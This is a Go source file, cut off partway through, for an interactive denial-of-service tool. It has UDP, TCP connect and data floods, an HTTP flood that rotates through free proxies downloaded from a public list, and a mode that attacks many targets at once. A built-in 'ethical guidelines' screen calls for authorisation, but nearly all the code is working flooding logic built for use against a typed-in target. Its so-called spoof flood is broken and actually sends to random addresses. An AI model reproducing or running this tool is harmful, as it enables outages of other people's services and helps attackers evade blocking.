package main

import (
	"bufio"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Terminal colors
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorBlue   = "\033[34m"
	colorCyan   = "\033[36m"
	colorPurple = "\033[35m"
	colorWhite  = "\033[37m"
)

// Proxy info
type Proxy struct {
	Address  string `json:"address"`
	Username string `json:"username,omitempty"`
	Password string `json:"password,omitempty"`
	Type     string `json:"type"`
	Country  string `json:"country,omitempty"`
	Speed    string `json:"speed,omitempty"`
	LastTest time.Time `json:"last_test,omitempty"`
	Working  bool   `json:"working"`
}

// Stats tracker
type AttackStats struct {
	StartTime      time.Time
	EndTime        time.Time
	PacketsSent    int64
	BytesSent      int64
	Errors         int64
	CurrentSpeed   int64
	AverageSpeed   int64
	TotalDuration  time.Duration
}

// Config settings
type Config struct {
	ProxyList      []Proxy `json:"proxies"`
	AttackTimeout  int     `json:"attack_timeout"`
	ThreadCount    int     `json:"thread_count"`
	PacketSize     int     `json:"packet_size"`
	AutoRefresh    bool    `json:"auto_refresh"`
	SaveLogs       bool    `json:"save_logs"`
	BypassFirewall bool    `json:"bypass_firewall"`
}

// Global vars
var (
	proxyList      []Proxy
	proxyIndex     int32 = 0
	useProxy       bool  = false
	proxyMutex     sync.Mutex
	lastUpdate     time.Time
	protocolType   string = "all"
	attackStats    AttackStats
	statsMutex     sync.Mutex
	config         Config
	stopAttack     bool = false
	pauseAttack    bool = false
	pauseMutex     sync.Mutex
	results        []string
	resultMutex    sync.Mutex
)

// ============ PRINT FUNCTIONS ============

func printColor(color, message string) {
	fmt.Print(color + message + colorReset)
}

func info(message string) {
	printColor(colorCyan, "[*] "+message+"\n")
}

func success(message string) {
	printColor(colorGreen, "[+] "+message+"\n")
}

func errorMsg(message string) {
	printColor(colorRed, "[!] "+message+"\n")
}

func warning(message string) {
	printColor(colorYellow, "[⚠] "+message+"\n")
}

// ============ CORE HELPERS ============

// Check if file/folder exists
func Exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}

// Run shell command and get output
func Shellout(command string) (string, error) {
	var stdout, stderr strings.Builder
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	
	err := cmd.Run()
	if err != nil {
		return stderr.String(), fmt.Errorf("command execution failed: %v, stderr: %s", err, stderr.String())
	}
	
	return stdout.String(), nil
}

// Run shell command with live output
func ShelloutLive(command string) error {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("command execution failed: %v", err)
	}
	
	return nil
}

// Run multiple shell commands
func ShelloutMultiple(commands []string) ([]string, error) {
	var results []string
	
	for _, cmd := range commands {
		output, err := Shellout(cmd)
		if err != nil {
			return results, fmt.Errorf("command '%s' execution failed: %v", cmd, err)
		}
		results = append(results, output)
	}
	
	return results, nil
}

// ============ FILE OPS ============

// Save attack results
func saveResults(filename string) error {
	resultMutex.Lock()
	defer resultMutex.Unlock()
	
	content := strings.Join(results, "\n")
	err := os.WriteFile(filename, []byte(content), 0644)
	if err != nil {
		return fmt.Errorf("failed to save results: %v", err)
	}
	
	success(fmt.Sprintf("Results saved to '%s'", filename))
	return nil
}

// Add to result log
func addResult(result string) {
	resultMutex.Lock()
	defer resultMutex.Unlock()
	
	results = append(results, fmt.Sprintf("[%s] %s", time.Now().Format("2006-01-02 15:04:05"), result))
}

// Load config file
func loadConfig(filename string) error {
	if !Exists(filename) {
		// Create default config
		config = Config{
			AttackTimeout:  60,
			ThreadCount:    10,
			PacketSize:     1024,
			AutoRefresh:    true,
			SaveLogs:       true,
			BypassFirewall: false,
		}
		return saveConfig(filename)
	}
	
	data, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read config: %v", err)
	}
	
	err = json.Unmarshal(data, &config)
	if err != nil {
		return fmt.Errorf("failed to parse config JSON: %v", err)
	}
	
	success("Config loaded successfully")
	return nil
}

// Save config file
func saveConfig(filename string) error {
	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to create config JSON: %v", err)
	}
	
	err = os.WriteFile(filename, data, 0644)
	if err != nil {
		return fmt.Errorf("failed to save config: %v", err)
	}
	
	success(fmt.Sprintf("Config saved to '%s'", filename))
	return nil
}

// ============ PROXY STUFF ============

// Get proxies from Proxifly
func loadProxiesFromProxifly(protocol string) ([]string, error) {
	var url string

	switch protocol {
	case "all":
		url = "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt"
	case "http":
		url = "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt"
	case "socks4":
		url = "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt"
	case "socks5":
		url = "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt"
	default:
		return nil, fmt.Errorf("unknown proxy type: %s", protocol)
	}

	info("Downloading proxies from Proxifly...")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download proxies: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("server error: %s", resp.Status)
	}

	scanner := bufio.NewScanner(resp.Body)
	var proxies []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("failed to read data: %v", err)
	}

	return proxies, nil
}

// Refresh proxy list
func updateProxyList(protocol string) error {
	proxyMutex.Lock()
	defer proxyMutex.Unlock()

	proxies, err := loadProxiesFromProxifly(protocol)
	if err != nil {
		return err
	}

	proxyList = []Proxy{}
	for _, p := range proxies {
		proxy := Proxy{
			Address: p,
			Type:    protocol,
			Working: true,
		}

		if protocol == "socks4" || protocol == "socks5" {
			proxy.Address = protocol + "://" + p
		} else {
			proxy.Address = "http://" + p
		}
		proxyList = append(proxyList, proxy)
	}

	lastUpdate = time.Now()
	useProxy = true
	success(fmt.Sprintf("Loaded %d proxies (type: %s)", len(proxyList), protocol))
	addResult(fmt.Sprintf("Loaded %d proxies (type: %s)", len(proxyList), protocol))
	return nil
}

// Get next proxy (round-robin)
func getNextProxy() *Proxy {
	proxyMutex.Lock()
	defer proxyMutex.Unlock()

	if !useProxy || len(proxyList) == 0 {
		return nil
	}

	// Try to get working proxy
	for i := 0; i < len(proxyList); i++ {
		idx := atomic.AddInt32(&proxyIndex, 1) % int32(len(proxyList))
		if idx < 0 {
			idx = 0
		}
		if proxyList[idx].Working {
			return &proxyList[idx]
		}
	}

	// If no working proxy, return first one
	return &proxyList[0]
}

// HTTP client with proxy
func getHTTPClient() *http.Client {
	if !useProxy || len(proxyList) == 0 {
		return &http.Client{Timeout: 5 * time.Second}
	}

	proxy := getNextProxy()
	if proxy == nil {
		return &http.Client{Timeout: 5 * time.Second}
	}

	proxyURL, err := url.Parse(proxy.Address)
	if err != nil {
		return &http.Client{Timeout: 5 * time.Second}
	}

	if proxy.Username != "" && proxy.Password != "" {
		proxyURL.User = url.UserPassword(proxy.Username, proxy.Password)
	}

	return &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		},
		Timeout: 5 * time.Second,
	}
}

// Check if proxy works
func testProxy(proxy Proxy) bool {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			Proxy: func(req *http.Request) (*url.URL, error) {
				return url.Parse(proxy.Address)
			},
		},
	}
	
	start := time.Now()
	resp, err := client.Get("http://httpbin.org/ip")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	if time.Since(start) > 3*time.Second {
		return false
	}
	
	proxy.Speed = fmt.Sprintf("%dms", time.Since(start).Milliseconds())
	proxy.LastTest = time.Now()
	proxy.Working = true
	
	return true
}

// Validate all proxies
func validateAllProxies() {
	info("Validating all proxies...")
	
	var wg sync.WaitGroup
	var validCount int32 = 0
	
	for i := range proxyList {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			if testProxy(proxyList[idx]) {
				atomic.AddInt32(&validCount, 1)
				proxyList[idx].Working = true
			} else {
				proxyList[idx].Working = false
			}
		}(i)
	}
	
	wg.Wait()
	
	success(fmt.Sprintf("%d/%d proxies are working", validCount, len(proxyList)))
	addResult(fmt.Sprintf("Proxy validation: %d/%d working", validCount, len(proxyList)))
}

// Load proxies from text file
func loadProxiesFromFile(filename string) error {
	if !Exists(filename) {
		return fmt.Errorf("file '%s' not found", filename)
	}
	
	data, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read file: %v", err)
	}
	
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			proxy := Proxy{
				Address: "http://" + line,
				Type:    "file",
				Working: true,
			}
			proxyList = append(proxyList, proxy)
			useProxy = true
		}
	}
	
	success(fmt.Sprintf("Loaded %d proxies from file", len(proxyList)))
	return nil
}

// ============ STATS ============

// Update attack stats
func updateStats(packets int64, bytes int64) {
	statsMutex.Lock()
	defer statsMutex.Unlock()
	
	attackStats.PacketsSent += packets
	attackStats.BytesSent += bytes
}

// Show attack stats
func showStats() {
	statsMutex.Lock()
	defer statsMutex.Unlock()
	
	fmt.Println("\n" + strings.Repeat("=", 50))
	printColor(colorCyan, "📊 Attack Statistics\n")
	fmt.Printf("Packets Sent: %d\n", attackStats.PacketsSent)
	fmt.Printf("Bytes Sent: %d (%.2f MB)\n", attackStats.BytesSent, float64(attackStats.BytesSent)/1024/1024)
	fmt.Printf("Errors: %d\n", attackStats.Errors)
	fmt.Printf("Duration: %v\n", time.Since(attackStats.StartTime))
	
	if attackStats.PacketsSent > 0 {
		speed := float64(attackStats.PacketsSent) / time.Since(attackStats.StartTime).Seconds()
		fmt.Printf("Speed: %.2f packets/second\n", speed)
	}
	fmt.Println(strings.Repeat("=", 50))
}

// Pause attack
func pauseAttackFunc() {
	pauseMutex.Lock()
	pauseAttack = true
	pauseMutex.Unlock()
	info("⏸️ Attack paused. Press 'r' to resume.")
}

// Resume attack
func resumeAttackFunc() {
	pauseMutex.Lock()
	pauseAttack = false
	pauseMutex.Unlock()
	info("▶️ Attack resumed.")
}

// Random IP for spoofing
func generateRandomIP() string {
	ip := make([]byte, 4)
	rand.Read(ip)
	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

// ============ FLOOD METHODS ============

// UDP flood with fixed payload
func udpPlainFlood(ip string, port int, duration int, packetSize int) {
	addr := fmt.Sprintf("%s:%d", ip, port)
	udpAddr, _ := net.ResolveUDPAddr("udp", addr)
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		errorMsg(fmt.Sprintf("UDP connection failed: %v", err))
		return
	}
	defer conn.Close()

	payload := make([]byte, packetSize)
	for i := range payload {
		payload[i] = 'A'
	}

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	var packetCount int64 = 0

	info(fmt.Sprintf("UDP Plain flood started: %s:%d, Packet size: %d bytes, Duration: %d seconds", ip, port, packetSize, duration))
	addResult(fmt.Sprintf("UDP Plain flood started: %s:%d", ip, port))

	for time.Now().Before(endTime) {
		// Check for pause
		pauseMutex.Lock()
		if pauseAttack {
			pauseMutex.Unlock()
			time.Sleep(1 * time.Second)
			continue
		}
		pauseMutex.Unlock()
		
		_, err := conn.Write(payload)
		if err != nil {
			atomic.AddInt64(&attackStats.Errors, 1)
			break
		}
		atomic.AddInt64(&packetCount, 1)
		updateStats(1, int64(packetSize))
	}

	success(fmt.Sprintf("UDP Plain flood finished! Total packets: %d", atomic.LoadInt64(&packetCount)))
	addResult(fmt.Sprintf("UDP Plain flood finished: %d packets", packetCount))
}

// UDP flood with random payload
func udpRandomFlood(ip string, port int, duration int, packetSize int) {
	addr := fmt.Sprintf("%s:%d", ip, port)
	udpAddr, _ := net.ResolveUDPAddr("udp", addr)
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		errorMsg(fmt.Sprintf("UDP connection failed: %v", err))
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	var packetCount int64 = 0

	info(fmt.Sprintf("UDP Random flood started: %s:%d, Packet size: %d bytes, Duration: %d seconds", ip, port, packetSize, duration))
	addResult(fmt.Sprintf("UDP Random flood started: %s:%d", ip, port))

	for time.Now().Before(endTime) {
		pauseMutex.Lock()
		if pauseAttack {
			pauseMutex.Unlock()
			time.Sleep(1 * time.Second)
			continue
		}
		pauseMutex.Unlock()
		
		payload := make([]byte, packetSize)
		rand.Read(payload)

		_, err := conn.Write(payload)
		if err != nil {
			atomic.AddInt64(&attackStats.Errors, 1)
			break
		}
		atomic.AddInt64(&packetCount, 1)
		updateStats(1, int64(packetSize))
	}

	success(fmt.Sprintf("UDP Random flood finished! Total packets: %d", atomic.LoadInt64(&packetCount)))
	addResult(fmt.Sprintf("UDP Random flood finished: %d packets", packetCount))
}

// UDP flood with spoofed IP
func udpSpoofFlood(ip string, port int, duration int, packetSize int) {
	info(fmt.Sprintf("UDP Spoof flood started: %s:%d", ip, port))
	addResult(fmt.Sprintf("UDP Spoof flood started: %s:%d", ip, port))
	
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	var packetCount int64 = 0
	
	for time.Now().Before(endTime) {
		pauseMutex.Lock()
		if pauseAttack {
			pauseMutex.Unlock()
			time.Sleep(1 * time.Second)
			continue
		}
		pauseMutex.Unlock()
		
		spoofedIP := generateRandomIP()
		addr := fmt.Sprintf("%s:%d", spoofedIP, port)
		
		conn, err := net.DialTimeout("udp", addr, 1*time.Second)
		if err == nil {
			payload := make([]byte, packetSize)
			rand.Read(payload)
			conn.Write(payload)
			conn.Close()
			atomic.AddInt64(&packetCount, 1)
			updateStats(1, int64(packetSize))
		} else {
			atomic.AddInt64(&attackStats.Errors, 1)
		}
	}
	
	success(fmt.Sprintf("UDP Spoof flood finished! Total packets: %d", packetCount))
	addResult(fmt.Sprintf("UDP Spoof flood finished: %d packets", packetCount))
}

// TCP SYN flood single thread
func tcpSynFloodSingle(ip string, port int, duration int) {
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	var packetCount int64 = 0

	info(fmt.Sprintf("TCP SYN flood started: %s:%d, Duration: %d seconds", ip, port, duration))
	addResult(fmt.Sprintf("TCP SYN flood started: %s:%d", ip, port))

	for time.Now().Before(endTime) {
		pauseMutex.Lock()
		if pauseAttack {
			pauseMutex.Unlock()
			time.Sleep(1 * time.Second)
			continue
		}
		pauseMutex.Unlock()
		
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 1*time.Second)
		if err == nil {
			conn.Close()
		} else {
			atomic.AddInt64(&attackStats.Errors, 1)
		}
		atomic.AddInt64(&packetCount, 1)
		updateStats(1, 40) // TCP SYN packet is ~40 bytes
	}

	success(fmt.Sprintf("TCP SYN flood finished! Total SYN packets: %d", atomic.LoadInt64(&packetCount)))
	addResult(fmt.Sprintf("TCP SYN flood finished: %d packets", packetCount))
}

// TCP SYN flood multi-threaded
func tcpSynFloodMulti(ip string, port int, duration int) {
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	var packetCount int64 = 0
	var wg sync.WaitGroup

	info(fmt.Sprintf("TCP SYN flood (Multi-threaded) started: %s:%d, Duration: %d seconds", ip, port, duration))
	addResult(fmt.Sprintf("TCP SYN flood (Multi) started: %s:%d", ip, port))

	workerCount := config.ThreadCount
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(endTime) {
				pauseMutex.Lock()
				if pauseAttack {
					pauseMutex.Unlock()
					time.Sleep(1 * time.Second)
					continue
				}
				pauseMutex.Unlock()
				
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 1*time.Second)
				if err == nil {
					conn.Close()
				} else {
					atomic.AddInt64(&attackStats.Errors, 1)
				}
				atomic.AddInt64(&packetCount, 1)
				updateStats(1, 40)
			}
		}()
	}

	wg.Wait()
	success(fmt.Sprintf("TCP SYN flood (Multi-threaded) finished! Total SYN packets: %d", atomic.LoadInt64(&packetCount)))
	addResult(fmt.Sprintf("TCP SYN flood (Multi) finished: %d packets", packetCount))
}

// TCP data flood single thread
func tcpDataFloodSingle(ip string, port int, duration int, packetSize int) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 5*time.Second)
	if err != nil {
		errorMsg(fmt.Sprintf("TCP connection failed: %v", err))
		return
	}
	defer conn.Close()

	payload := make([]byte, packetSize)
	rand.Read(payload)

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	var packetCount int64 = 0

	info(fmt.Sprintf("TCP Data flood started: %s:%d, Packet size: %d bytes, Duration: %d seconds", ip, port, packetSize, duration))
	addResult(fmt.Sprintf("TCP Data flood started: %s:%d", ip, port))

	for time.Now().Before(endTime) {
		pauseMutex.Lock()
		if pauseAttack {
			pauseMutex.Unlock()
			time.Sleep(1 * time.Second)
			continue
		}
		pauseMutex.Unlock()
		
		_, err := conn.Write(payload)
		if err != nil {
			atomic.AddInt64(&attackStats.Errors, 1)
			break
		}
		atomic.AddInt64(&packetCount, 1)
		updateStats(1, int64(packetSize))
	}

	success(fmt.Sprintf("TCP Data flood finished! Total packets: %d", atomic.LoadInt64(&packetCount)))
	addResult(fmt.Sprintf("TCP Data flood finished: %d packets", packetCount))
}

// TCP data flood multi-threaded
func tcpDataFloodMulti(ip string, port int, duration int, packetSize int) {
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	var packetCount int64 = 0
	var wg sync.WaitGroup

	info(fmt.Sprintf("TCP Data flood (Multi-threaded) started: %s:%d, Packet size: %d bytes, Duration: %d seconds", ip, port, packetSize, duration))
	addResult(fmt.Sprintf("TCP Data flood (Multi) started: %s:%d", ip, port))

	workerCount := config.ThreadCount
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 5*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()

			payload := make([]byte, packetSize)
			rand.Read(payload)

			for time.Now().Before(endTime) {
				pauseMutex.Lock()
				if pauseAttack {
					pauseMutex.Unlock()
					time.Sleep(1 * time.Second)
					continue
				}
				pauseMutex.Unlock()
				
				_, err := conn.Write(payload)
				if err != nil {
					atomic.AddInt64(&attackStats.Errors, 1)
					break
				}
				atomic.AddInt64(&packetCount, 1)
				updateStats(1, int64(packetSize))
			}
		}()
	}

	wg.Wait()
	success(fmt.Sprintf("TCP Data flood (Multi-threaded) finished! Total packets: %d", atomic.LoadInt64(&packetCount)))
	addResult(fmt.Sprintf("TCP Data flood (Multi) finished: %d packets", packetCount))
}

// HTTP flood with proxy support
func httpFlood(urlStr string, duration int) {
	if useProxy {
		go func() {
			for {
				time.Sleep(5 * time.Minute)
				if config.AutoRefresh {
					info("Refreshing proxy list...")
					err := updateProxyList(protocolType)
					if err != nil {
						errorMsg(fmt.Sprintf("Proxy refresh failed: %v", err))
					}
				}
			}
		}()
	}

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	var requestCount int64 = 0
	var wg sync.WaitGroup

	if useProxy {
		info(fmt.Sprintf("HTTP flood started with %d proxies", len(proxyList)))
	} else {
		info("HTTP flood started without proxies")
	}
	addResult(fmt.Sprintf("HTTP flood started: %s", urlStr))

	workerCount := config.ThreadCount
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			client := getHTTPClient()

			for time.Now().Before(endTime) {
				pauseMutex.Lock()
				if pauseAttack {
					pauseMutex.Unlock()
					time.Sleep(1 * time.Second)
					continue
				}
				pauseMutex.Unlock()
				
				resp, err := client.Get(urlStr)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				} else {
					atomic.AddInt64(&attackStats.Errors, 1)
				}
				atomic.AddInt64(&requestCount, 1)
				updateStats(1, 512)

				if useProxy && len(proxyList) > 0 {
					client = getHTTPClient()
				}
			}
		}()
	}

	wg.Wait()
	success(fmt.Sprintf("HTTP flood finished! Total requests: %d", atomic.LoadInt64(&requestCount)))
	addResult(fmt.Sprintf("HTTP flood finished: %d requests", requestCount))
}

// Attack multiple targets
func multiTargetAttack(targets []string, port int, duration int, packetSize int) {
	info(fmt.Sprintf("Starting attack on %d targets", len(targets)))
	addResult(fmt.Sprintf("Multi-target attack started: %d targets", len(targets)))
	
	var wg sync.WaitGroup
	for _, target := range targets {
		wg.Add(1)
		go func(t string) {
			defer wg.Done()
			info(fmt.Sprintf("Attacking target: %s:%d", t, port))
			udpPlainFlood(t, port, duration, packetSize)
		}(target)
	}
	
	wg.Wait()
	success("All targets attacked successfully")
	addResult("Multi-target attack finished")
}

// ============ ETHICAL GUIDELINES ============

func showEthicalGuidelines() {
	printColor(colorCyan, "\n====================================\n")
	printColor(colorCyan, "   ETHICAL TESTING GUIDELINES\n")
	printColor(colorCyan, "====================================\n\n")
	
	printColor(colorYellow, "🔒 LEGAL REQUIREMENTS:\n")
	printColor(colorWhite, "1. You must have WRITTEN permission from the system owner\n")
	printColor(colorWhite, "2. Only test systems you own or have explicit authorization for\n")
	printColor(colorWhite, "3. Follow all applicable local, state, and federal laws\n")
	printColor(colorWhite, "4. Respect privacy and data protection regulations\n\n")
	
	printColor(colorYellow, "✅ ACCEPTABLE USE CASES:\n")
	printColor(colorWhite, "✓ Internal network security assessments\n")
	printColor(colorWhite, "✓ Authorized penetration testing engagements\n")
	printColor(colorWhite, "✓ Educational demonstrations in controlled environments\n")
	printColor(colorWhite, "✓ Performance testing on YOUR OWN infrastructure\n")
	printColor(colorWhite, "✓ Bug bounty programs with explicit scope\n\n")
	
	printColor(colorRed, "❌ PROHIBITED USES:\n")
	printColor(colorWhite, "✗ Any unauthorized testing or attacks\n")
	printColor(colorWhite, "✗ Denial of Service against production systems\n")
	printColor(colorWhite, "✗ Testing systems without explicit permission\n")
	printColor(colorWhite, "✗ Using this tool for malicious purposes\n")
	printColor(colorWhite, "✗ Any use that violates laws or regulations\n\n")
	
	printColor(colorYellow, "📝 RESPONSIBLE DISCLOSURE:\n")
	printColor(colorWhite, "If you discover vulnerabilities during authorized testing:\n")
	printColor(colorWhite, "1. Document findings thoroughly\n")
	printColor(colorWhite, "2. Report responsibly to the system owner\n")
	printColor(colorWhite, "3. Allow reasonable time for remediation\n")
	printColor(colorWhite, "4. Do NOT share findings publicly without permission\n\n")
	
	printColor(colorGreen, "====================================\n")
	printColor(colorGreen, "   Remember: With great power\n")
	printColor(colorGreen, "   comes great responsibility.\n")
	printColor(colorGreen, "====================================\n\n")
	
	fmt.Print(colorYellow + "Press Enter to continue...")
	fmt.Scanln()
}

// ============ ADVANCED FEATURES ============

// Network diagnostics
func networkDiagnostics(target string) {
	info("Running network diagnostics...")
	addResult(fmt.Sprintf("Network diagnostics started for: %s", target))
	
	if Exists("/usr/bin/ping") || Exists("/bin/ping") {
		output, err := Shellout(fmt.Sprintf("ping -c 4 %s", target))
		if err != nil {
			warning(fmt.Sprintf("Ping result: %s", err))
		} else {
			success("Ping completed:")
			fmt.Println(output)
			addResult(fmt.Sprintf("Ping completed for: %s", target))
		}
	} else {
		warning("ping command not found")
	}
	
	if Exists("/usr/bin/traceroute") || Exists("/bin/traceroute") {
		info("Running traceroute...")
		go func() {
			err := ShelloutLive(fmt.Sprintf("traceroute %s", target))
			if err != nil {
				errorMsg(fmt.Sprintf("Traceroute error: %v", err))
			}
		}()
	}
}

// System information
func systemInfo() {
	info("Collecting system information...")
	addResult("System information collected")
	
	commands := []string{
		"uname -a",
		"whoami",
		"pwd",
		"date",
		"uptime",
	}
	
	if runtime.GOOS == "windows" {
		commands = []string{
			"systeminfo | findstr /B /C:\"OS Name\"",
			"whoami",
			"echo %cd%",
			"date /t",
			"time /t",
		}
	}
	
	results, err := ShelloutMultiple(commands)
	if err != nil {
		errorMsg(fmt.Sprintf("System info error: %v", err))
	} else {
		success("System information:")
		for i, result := range results {
			if result != "" {
				fmt.Printf("Command %d:\n%s\n", i+1, result)
			}
		}
	}
}

// ============ INPUT VALIDATION ============

func validateInt(prompt string, minVal, maxVal int) int {
	for {
		fmt.Print(colorBlue + prompt + colorReset)
		var input string
		fmt.Scanln(&input)

		value, err := strconv.Atoi(input)
		if err != nil {
			errorMsg("Invalid input! Please enter a number.")
			continue
		}

		if value >= minVal && value <= maxVal {
			return value
		}
		errorMsg(fmt.Sprintf("Value must be between %d and %d.", minVal, maxVal))
	}
}

func validateFloat(prompt string, minVal float64) float64 {
	for {
		fmt.Print(colorBlue + prompt + colorReset)
		var input string
		fmt.Scanln(&input)

		value, err := strconv.ParseFloat(input, 64)
		if err != nil {
			errorMsg("Invalid input! Please enter a number.")
			continue
		}

		if value >= minVal {
			return value
		}
		errorMsg(fmt.Sprintf("Value must be at least %.0f.", minVal))
	}
}

// ============ MENU FUNCTIONS ============

func startAttack() {
	printColor(colorBlue, "\n=== Attack Configuration ===\n")
	printColor(colorBlue, "1. UDP Flood\n")
	printColor(colorBlue, "2. TCP SYN Flood\n")
	printColor(colorBlue, "3. TCP Data Flood\n")
	printColor(colorBlue, "4. HTTP Flood\n")
	printColor(colorBlue, "5. UDP Spoof Flood\n")
	printColor(colorBlue, "6. Multi-Target Attack\n")

	method := validateInt("Select method (1-6): ", 1, 6)

	if method == 6 {
		fmt.Print(colorBlue + "Target IPs (comma separated): " + colorReset)
		var targetStr string
		fmt.Scanln(&targetStr)
		targets := strings.Split(targetStr, ",")
		for i := range targets {
			targets[i] = strings.TrimSpace(targets[i])
		}
		port := validateInt("Port (1-65535): ", 1, 65535)
		duration := int(validateFloat("Duration (seconds): ", 1))
		packetSize := validateInt("Packet size (bytes): ", 1, 65500)
		multiTargetAttack(targets, port, duration, packetSize)
		return
	}

	fmt.Print(colorBlue + "Target IP: " + colorReset)
	var ip string
	fmt.Scanln(&ip)

	port := validateInt("Port (1-65535): ", 1, 65535)
	duration := int(validateFloat("Duration (seconds): ", 1))

	if method == 1 || method == 5 {
		packetSize := validateInt("Packet size (bytes, 1-65500): ", 1, 65500)
		if method == 1 {
			udpPlainFlood(ip, port, duration, packetSize)
		} else {
			udpSpoofFlood(ip, port, duration, packetSize)
		}
	} else if method == 2 {
		printColor(colorBlue, "Execution Style:\n")
		printColor(colorBlue, "1. Single\n")
		printColor(colorBlue, "2. Multi-threaded\n")
		style := validateInt("Select style (1-2): ", 1, 2)
		if style == 1 {
			tcpSynFloodSingle(ip, port, duration)
		} else {
			tcpSynFloodMulti(ip, port, duration)
		}
	} else if method == 3 {
		packetSize := validateInt("Packet size (bytes): ", 1, 65500)
		printColor(colorBlue, "Execution Style:\n")
		printColor(colorBlue, "1. Single\n")
		printColor(colorBlue, "2. Multi-threaded\n")
		style := validateInt("Select style (1-2): ", 1, 2)
		if style == 1 {
			tcpDataFloodSingle(ip, port, duration, packetSize)
		} else {
			tcpDataFloodMulti(ip, port, duration, packetSize)
		}
	} else if method == 4 {
		fmt.Print(colorBlue + "URL: " + colorReset)
		var urlStr string
		fmt.Scanln(&urlStr)
		if !strings.HasPrefix(urlStr, "http://") && !strings.HasPrefix(urlStr, "https://") {
			urlStr = "http://" + urlStr
		}
		httpFlood(urlStr, duration)
	}
}

func configureProxy() {
	printColor(colorYellow, "\nProxy Configuration:\n")
	printColor(colorYellow, "1. Auto-load from Proxifly\n")
	printColor(colorYellow, "2. Manual proxy input\n")
	printColor(colorYellow, "3. Load from file\n")
	printColor(colorYellow, "4. Disable proxies\n")

	choice := validateInt("Choice (1-4): ", 1, 4)

	switch choice {
	case 1:
		printColor(colorYellow, "Proxy Type:\n")
		printColor(colorYellow, "1. All\n")
		printColor(colorYellow, "2. HTTP\n")
		printColor(colorYellow, "3. SOCKS4\n")
		printColor(colorYellow, "4. SOCKS5\n")
		proto := validateInt("Choice (1-4): ", 1, 4)
		
		protocolMap := map[int]string{1: "all", 2: "http", 3: "socks4", 4: "socks5"}
		protocolType = protocolMap[proto]
		
		err := updateProxyList(protocolType)
		if err != nil {
			errorMsg(fmt.Sprintf("Failed to load proxies: %v", err))
		}
		
	case 2:
		info("Enter proxies (ip:port format, type 'done' to finish):")
		for {
			fmt.Print(colorYellow + "Proxy: " + colorReset)
			var proxyStr string
			fmt.Scanln(&proxyStr)

			if proxyStr == "done" || proxyStr == "" {
				break
			}

			proxy := Proxy{
				Address: "http://" + proxyStr,
				Type:    "manual",
				Working: true,
			}
			proxyList = append(proxyList, proxy)
			useProxy = true
		}
		success(fmt.Sprintf("Added %d proxies.", len(proxyList)))
		
	case 3:
		fmt.Print(colorBlue + "Filename: " + colorReset)
		var filename string
		fmt.Scanln(&filename)
		err := loadProxiesFromFile(filename)
		if err != nil {
			errorMsg(fmt.Sprintf("Failed to load proxies: %v", err))
		}
		
	case 4:
		useProxy = false
		proxyList = []Proxy{}
